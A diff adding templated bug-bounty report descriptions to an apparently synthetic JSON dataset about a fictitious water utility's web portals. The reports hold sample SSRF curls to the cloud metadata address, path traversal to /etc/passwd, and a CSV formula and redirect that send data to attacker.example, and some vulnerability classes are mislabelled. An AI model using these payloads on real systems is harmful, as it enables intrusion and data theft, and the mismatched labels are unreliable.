+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6848,7 +6902,8 @@
           "offset": "6d 10h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6949,7 +7004,8 @@
           "offset": "1d 15h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7076,7 +7132,8 @@
           "offset": "2d 9h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -7174,7 +7231,8 @@
           "offset": "1d 6h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7312,7 +7370,8 @@
           "offset": "2d 2h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7476,7 +7535,8 @@
           "offset": "4d 12h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7615,7 +7675,8 @@
           "offset": "2d 18h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7741,7 +7802,8 @@
           "offset": "4d 2h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7857,7 +7919,8 @@
           "offset": "1d 14h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8012,7 +8075,8 @@
           "offset": "8d 22h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8156,7 +8220,8 @@
           "offset": "8d 23h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8282,7 +8347,8 @@
           "offset": "5d 21h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8441,7 +8507,8 @@
           "offset": "6d 2h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8573,7 +8640,8 @@
           "offset": "3d 23h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8697,7 +8765,8 @@
           "offset": "3d 12h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/export`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8799,7 +8868,8 @@
           "offset": "5d 16h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8910,7 +8980,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8985,7 +9056,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9088,7 +9160,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9228,7 +9301,8 @@
           "offset": "8d 1h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9357,7 +9431,8 @@
           "offset": "2d 11h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9505,7 +9580,8 @@
           "offset": "1d 4h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/admin/queue`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9677,7 +9753,8 @@
           "offset": "3d 23h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9793,7 +9870,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9912,7 +9990,8 @@
           "offset": "1d 19h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10068,7 +10147,8 @@
           "offset": "2d 18h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10250,7 +10330,8 @@
           "offset": "9d 4h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10417,7 +10498,8 @@
           "offset": "8d 20h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10572,7 +10654,8 @@
           "offset": "2d 23h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/statements/`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10700,7 +10783,8 @@
           "offset": "2d 21h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10824,7 +10908,8 @@
           "offset": "4d 4h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
